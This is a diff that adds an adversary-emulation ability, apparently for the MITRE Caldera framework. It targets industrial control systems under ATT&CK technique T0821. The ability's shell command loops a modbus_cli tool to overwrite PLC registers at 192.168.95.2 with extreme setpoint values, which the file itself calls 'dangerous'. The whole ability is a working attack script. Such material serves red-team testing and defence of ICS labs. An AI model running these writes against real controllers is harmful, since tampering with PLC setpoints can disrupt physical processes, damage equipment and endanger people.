@@ -1,0 +1,24 @@
+---
+
+- id: d4e5f6a7-4444-4444-4444-000000000002
+  name: Modbus - Overwrite PLC Setpoints
+  description: |
+    Write dangerous setpoint values to PLC registers.
+    Reduced to 20 iterations to avoid Caldera timeout.
+  tactic: execution
+  technique_id: T0821
+  technique_name: Modify Controller Tasking
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      for i in $(seq 1 20); do
+        ./modbus_cli 192.168.95.2 --port 502 write_r 0 65535;
+        ./modbus_cli 192.168.95.2 --port 502 write_r 2 0;
+        ./modbus_cli 192.168.95.2 --port 502 write_r 4 65535;
+        sleep 0.3;
+      done &&
+      echo "SETPOINTS_OVERWRITTEN"
+    payloads:
+    - modbus_cli
+    timeout: 120
